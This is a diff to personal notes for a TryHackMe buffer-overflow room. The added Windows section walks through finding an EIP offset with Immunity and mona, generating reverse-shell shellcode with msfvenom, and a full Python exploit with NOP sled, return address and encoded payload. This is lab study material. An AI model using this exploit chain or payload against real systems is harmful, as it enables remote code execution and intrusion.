@@ -2,6 +2,8 @@
 
 Based on experiences from TryHackMe room https://tryhackme.com/room/binex, I need to get better at this, so here is a mini writeup for that portion of the room.
 
+## Linux with GDB
+
 Instructions below are based on a executable that reads a string then overflows, named `bof`. The methodology here is largely extracted from one of the writeups for Binex: https://github.com/Syp1ng/Writeups/blob/master/THM/Binex.pdf. The author in turn sourced some knowledge from here: https://medium.com/@buff3r/basic-buffer-overflow-on-64-bit-architecture-3fb74bab3558
 
 1. First, generate a test string using metasploit's pattern_create.rb: 
@@ -137,4 +139,74 @@ Instructions below are based on a executable that reads a string then overflows,
     print(payload)
     ```
 
-10. Finally, all this in hand (and after setting up the shell listener!), run against the binary to exploit: `./bof < <(python exploit.py)`
+8. Finally, all this in hand (and after setting up the shell listener!), run against the binary to exploit: `./bof < <(python exploit.py)`
+
+## Windows with Immunity Debugger
+
+The process is similar, but with one change that might actually work for linux too. With windows, I need to get a copy on my host machine so I can exploit it locally to test it.
+
+1. First, just as with Linux, you need a pattern. metasploit is available for windows, but I just use WSL/Kali: `/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1000`  
+
+2. Install immunity if you dont have it, and mona.py. Mona can be obtained raw here: https://github.com/corelan/mona. Just save the py file under the 'PyCommands' folder in the immunity install directory (which for me was `C:\Program Files (x86)\Immunity Inc\Immunity Debugger`)
+
+    Immunity help:
+    
+    - when opening the binary with immunity it will start paused
+    - as a quick tip, go to the menu option `Options > Debugging Options > Security` and turn off 'Warn when terminating active processes'. Makes things a bit quicker.
+    - Press the 'play' button or F9 to run the program. The 'rewind' icon or Shift+F2 is restart (it will restart paused).
+    - the main windows used are 'CPU' which has four panes, and 'Log data'. There is also the command bar at the bottom, where you can invoke mona for example, and the results will show in log data. Otherwise CPU is what I keep up and maximised
+
+3. Proceed to fail the program with your test string. Immunity will flash and pause when the program has crashed. On the CPU pain you are looking for the EIP value. This should contain a number of overritted characters - copy this and calculate the offset with `pattern_offset.rb` as under Linux. Note that grabbing the EIP rather than the RBP - we are not overriting the return address here, rather we are forcing given command to be executed.
+
+4. Next, use mona to find the command we want to execute, specifically a `JMP ESP` call. From the command bar, run `!mona jmp -r esp`. The output will be in the log data window. For my test I had two entries - either could be used. Take the memory address (e.g. 0x080414c3) and reverse it into a string (e.g. `"\xc3\x14\x04\x08"`).
+
+5. Generate some shell code with MSF Venom. Here is a command that will do this while omitting two bad characters: `msfvenom --payload windows/shell_reverse_tcp LHOST=10.10.254.194 LPORT=5555 -b x00x0a --format python`
+
+6. Finally create the exploit python generator. Something like the below:
+
+    ```
+    from struct import pack
+
+    nop = '\x90'
+
+    buf =  b""
+    buf += b"\x2b\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81"
+    buf += b"\x76\x0e\xab\x95\x90\xaa\x83\xee\xfc\xe2\xf4\x57\x7d"
+    buf += b"\x12\xaa\xab\x95\xf0\x23\x4e\xa4\x50\xce\x20\xc5\xa0"
+    buf += b"\x21\xf9\x99\x1b\xf8\xbf\x1e\xe2\x82\xa4\x22\xda\x8c"
+    buf += b"\x9a\x6a\x3c\x96\xca\xe9\x92\x86\x8b\x54\x5f\xa7\xaa"
+    buf += b"\x52\x72\x58\xf9\xc2\x1b\xf8\xbb\x1e\xda\x96\x20\xd9"
+    buf += b"\x81\xd2\x48\xdd\x91\x7b\xfa\x1e\xc9\x8a\xaa\x46\x1b"
+    buf += b"\xe3\xb3\x76\xaa\xe3\x20\xa1\x1b\xab\x7d\xa4\x6f\x06"
+    buf += b"\x6a\x5a\x9d\xab\x6c\xad\x70\xdf\x5d\x96\xed\x52\x90"
+    buf += b"\xe8\xb4\xdf\x4f\xcd\x1b\xf2\x8f\x94\x43\xcc\x20\x99"
+    buf += b"\xdb\x21\xf3\x89\x91\x79\x20\x91\x1b\xab\x7b\x1c\xd4"
+    buf += b"\x8e\x8f\xce\xcb\xcb\xf2\xcf\xc1\x55\x4b\xca\xcf\xf0"
+    buf += b"\x20\x87\x7b\x27\xf6\xfd\xa3\x98\xab\x95\xf8\xdd\xd8"
+    buf += b"\xa7\xcf\xfe\xc3\xd9\xe7\x8c\xac\x6a\x45\x12\x3b\x94"
+    buf += b"\x90\xaa\x82\x51\xc4\xfa\xc3\xbc\x10\xc1\xab\x6a\x45"
+    buf += b"\xfa\xfb\xc5\xc0\xea\xfb\xd5\xc0\xc2\x41\x9a\x4f\x4a"
+    buf += b"\x54\x40\x07\xc0\xae\xfd\xef\xaa\xab\x94\xf8\xa8\xab"
+    buf += b"\x84\xcc\x23\x4d\xff\x80\xfc\xfc\xfd\x09\x0f\xdf\xf4"
+    buf += b"\x6f\x7f\x2e\x55\xe4\xa6\x54\xdb\x98\xdf\x47\xfd\x60"
+    buf += b"\x1f\x09\xc3\x6f\x7f\xc3\xf6\xfd\xce\xab\x1c\x73\xfd"
+    buf += b"\xfc\xc2\xa1\x5c\xc1\x87\xc9\xfc\x49\x68\xf6\x6d\xef"
+    buf += b"\xb1\xac\xab\xaa\x18\xd4\x8e\xbb\x53\x90\xee\xff\xc5"
+    buf += b"\xc6\xfc\xfd\xd3\xc6\xe4\xfd\xc3\xc3\xfc\xc3\xec\x5c"
+    buf += b"\x95\x2d\x6a\x45\x23\x4b\xdb\xc6\xec\x54\xa5\xf8\xa2"
+    buf += b"\x2c\x88\xf0\x55\x7e\x2e\x60\x1f\x09\xc3\xf8\x0c\x3e"
+    buf += b"\x28\x0d\x55\x7e\xa9\x96\xd6\xa1\x15\x6b\x4a\xde\x90"
+    buf += b"\x2b\xed\xb8\xe7\xff\xc0\xab\xc6\x6f\x7f"
+
+    calculated_offset = 146
+
+    final = nop*calculated_offset
+    final += "\xbf\x16\x04\x08"
+    final += nop*16
+    final += buf
+
+    print(final)
+    ```
+
+7. Run this against the program as normal, with a listener waiting, to hopefully get a windows command prompt shell.
+
